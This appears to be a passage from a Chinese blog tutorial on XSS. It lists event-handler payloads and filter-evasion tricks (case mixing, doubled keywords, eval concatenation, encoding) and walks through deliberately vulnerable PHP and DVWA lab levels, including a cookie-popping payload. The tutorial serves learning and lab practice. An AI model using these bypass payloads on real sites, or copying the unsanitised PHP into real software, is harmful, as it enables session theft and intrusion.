class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1);</span>&gt;</span>   <br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">xss</span>&quot;);&gt;</span><br><br></code></pre></td></tr></table></figure>### input<input> 标签规定了用户可以在其中输入数据的输入字段。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">onfocus 事件在对象获得焦点时发生：<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1);</span>&gt;</span><br><br></code></pre></td></tr></table></figure>竞争焦点，从而触发[onblur事件](https://so.csdn.net/so/search?q=onblur事件&spm=1001.2101.3001.7020)：<input onblur=alert(1) autofocus><input autofocus>input 标签的 autofocus 属性规定当页面加载时 元素应该自动获得焦点。可以通过autofocus属性自动执行本身的focus事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">&quot;alert(1);&quot;</span> <span class="hljs-attr">autofocus</span>&gt;</span><br><br>&quot; οnclick=alert(1)&gt;        这样需要点击一下输入框<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>&quot; onmouseover=alert(1)&gt;    需要鼠标划过输入框<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br></code></pre></td></tr></table></figure>### details<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">details</span>&gt;</span> 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 <span class="hljs-tag">&lt;<span class="hljs-name">details</span>&gt;</span> 元素时触发：<br><br><span class="hljs-tag">&lt;<span class="hljs-name">details</span> <span class="hljs-attr">ontoggle</span>=<span class="hljs-string">alert(1);</span>&gt;</span><br><br></code></pre></td></tr></table></figure>使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">details</span> <span class="hljs-attr">open</span> <span class="hljs-attr">ontoggle</span>=<span class="hljs-string">alert(1);</span>&gt;</span><br><br></code></pre></td></tr></table></figure>### svg<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span> 标签用来在HTML页面中直接嵌入SVG 文件的代码。<br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1);</span>&gt;</span><br><br></code></pre></td></tr></table></figure>### video<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">οnlοadstart</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;</span><br><br></code></pre></td></tr></table></figure>### style<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">οnlοad</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br></code></pre></td></tr></table></figure>### body<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">οnlοad</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">οnpageshοw</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><br></code></pre></td></tr></table></figure>### iframe<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span> 标签会创建包含另外一个文档的内联框架。  <br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1);</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>## 常见绕过过滤方法1.空格过滤当空格被过滤了时，我们可以用 / 来代替空格：/**/，注释符号绕过；/符号绕过；<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img/src<span class="hljs-operator">=</span><span class="hljs-string">&quot;x&quot;</span>/onerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;&gt;</span><br><br>也可以：<br><br>&lt;img/src<span class="hljs-operator">=</span><span class="hljs-string">&quot;x&quot;</span>onerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;&gt;</span><br></code></pre></td></tr></table></figure>2.引号过滤如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号：<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=alert(`xss`);&gt;<br><br></code></pre></td></tr></table></figure>3.括号过滤当括号被过滤的时候可以使用throw来绕过。throw 语句用于当错误发生时抛出一个错误。<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;<br>&lt;a <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;javascript:window.onerror=alert;throw 1&gt;</span><br></code></pre></td></tr></table></figure>4.关键字过滤大小写绕过<sCRiPt>alert(1);<ImG src="x" onerror="alert(1);">双写绕过<p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><p><scrscriptipt>alert(1);</scrscriptipt><br><imimgg srsrcc="x" onerror="alert(1);"><br>5.字符串拼接绕过</imimgg></p><p>利用eval()函数，与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;</span>&gt;<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;<br>// 在js中，我们可以用反引号代替单双引号<br></code></pre></td></tr></table></figure><p>6.JavaScript伪协议</p><p>“&gt;<a href="javascript:alert(/xss/)">                  o_n和<scr_ipt>过滤</scr_ipt></a></p><p>7.<strong>单引号闭合+htmlspecialchars函数绕过</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;onmouseover=&#x27;alert(/xss/)<br><br></code></pre></td></tr></table></figure><p>8.编码绕过</p><p>常见的编码</p><ul><li>unicode编码</li><li>url编码</li><li>ascii编码</li><li>hex编码</li><li>base64编码</li></ul><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>源代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>反射型XSS<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;action.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span>  <span class="hljs-comment">&lt;!-- &lt;form&gt;表示文档的服务器区域，此区域中包含一个Web站点的信息控件，用于向Web服务器区域提交 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br>//后端 action.php：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">    $name=$_POST[&quot;name&quot;]; </span><br><span class="hljs-meta">echo $name;</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>提交<script>alert('hack')</script></p><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230311202507690.png" alt="image-20230311202507690"></p><p>页面直接弹出了 hack 的页面，可以看到，我们插入的语句已经被页面给执行了。</p><p>这就是最基本的 <strong>反射型的 XSS 漏洞</strong> ，这种漏洞数据流向是： <strong>前端–&gt;后端–&gt;前端</strong></p><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>源代码</p><p>前端</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>存储型XSS<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;action2.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>        输入你的ID：  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        输入你的Name：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>后端action2.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;id&quot;</span>];<br><span class="hljs-variable">$name</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>];<br><span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>);<br><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;insert into xss value (<span class="hljs-subst">$id</span>,&#x27;<span class="hljs-subst">$name</span>&#x27;)&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>后端show2.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;locahost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from xss where id=1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230311205234936.png" alt="image-20230311205234936"></p><p>我们输入 1 和 <code>&lt;script&gt;alert(\&#39;hack\&#39;)&lt;/script&gt;</code> ，注意，这里的 hack 的单引号要进行转义，因为 sql 语句中的 $name 是单引号的，所以这里不转义的话就会闭合 sql 语句中的单引号。</p><p>然后当其他用户访问 show2.php 页面时，我们插入的 XSS 代码就执行了。<br><strong>存储型 XSS</strong> 的数据流向是：<strong>前端–&gt;后端–&gt;数据库–&gt;后端–&gt;前端</strong></p><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>low</p><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230314111625701.png" alt="image-20230314111625701"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">/?default=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230311211117713.png" alt="image-20230311211117713"></p><script>alert(document.cookie)</script> #可以弹出cookie<p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230311211336184.png" alt="image-20230311211336184"></p><p>medium</p><p>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br>    <span class="hljs-variable">$default</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>];<br>    <br>    <span class="hljs-comment"># Do not allow script tags</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span> (<span class="hljs-variable">$default</span>, <span class="hljs-string">&quot;&lt;script&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>array_key_exists — 检查数组里是否有指定的键名或索引</p><p>stripos — 查找字符串首次出现的位置（不区分大小写）</p><p>此处过滤了&lt;script 使用img标签&lt;img src&#x3D;1 οnerrοr&#x3D;(‘xss’)&gt;发现没有任何弹窗</p><p>发现已经插入了value属性中。我们需要插入到值中，那么可以闭合select和option标签来插入。</p><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230314113530028.png" alt="image-20230314113530028"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">?default=<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br>?default=<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230314113613135.png" alt="image-20230314113613135"></p><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230314113232825.png" alt="image-20230314113232825"></p><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230314112958648.png" alt="image-20230314112958648"></p><p>high</p><p>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br><br>    <span class="hljs-comment"># White list the allowable languages</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;French&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;English&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;German&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;Spanish&quot;</span>:<br>            <span class="hljs-comment"># ok</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>            <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>白名单过滤，只能选择四种语言</p><p>这里可以采用#方法来绕过服务器端的业务操作</p><p>#是一个浏览器指导字符，该字符后面的的数据不会被传到服务器后端，所以可以通过该符号来绕过后端代码的过滤，可以直接与浏览器进行交互</p><p>注意：#这个方法仅适用于DOM型<a href="https://so.csdn.net/so/search?q=xss&spm=1001.2101.3001.7020">xss</a>注入)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">#<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230314214536278.png" alt="image-20230314214536278"></p><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230314215331489.png" alt="image-20230314215331489"></p><p>impossible</p><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230314215622412.png" alt="image-20230314215622412"></p><p>不进行url编码</p><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230314215737945.png" alt="image-20230314215737945"></p><p>high:<option value="" + lang + "">“ + decodeURI(lang) + “</option></p><p>impossible:<option value="" + lang + "">“ + (lang) + “</option></p><h3 id="反射型-1"><a href="#反射型-1" class="headerlink" title="反射型"></a>反射型</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230311211432135.png" alt="image-20230311211432135"></p><p>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);  <span class="hljs-comment"># 未进行xss过滤</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123; <span class="hljs-comment"># 未进行过滤</span><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>medium</p><p>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);   <span class="hljs-comment"># 禁用xss过滤器</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );   <span class="hljs-comment">#使用str_replace函数进行替换</span><br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>str_replace — 子字符串替换，区分大小写</p><p>使用大小写过滤</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230311212248550.png" alt="image-20230311212248550"></p><p>high</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 